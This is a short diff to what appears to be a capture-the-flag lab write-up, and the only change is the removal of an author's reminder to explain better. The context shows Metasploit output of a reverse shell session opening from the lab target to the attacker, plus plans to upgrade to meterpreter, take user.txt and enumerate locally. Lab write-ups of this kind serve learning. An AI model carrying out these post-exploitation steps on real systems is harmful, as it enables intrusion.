@@ -203,7 +203,6 @@ After logging in via SSH we are greeted on our msf console window with.
 msf exploit(handler) > [*] Command shell session 1 opened (10.10.14.40:9999 -> 10.10.10.51:51008) at 2017-10-25 06:32:16 +0200
 ```
 
-#### AFTER THAT TO EDIT LOL NEED TO EXPLAIN BETTER AND MORE ####
 The next steps for me are upgrading the shell to meterpreter, snatching the user.txt and running local enumeration.
 
 ```{r, engine='bash', sh}
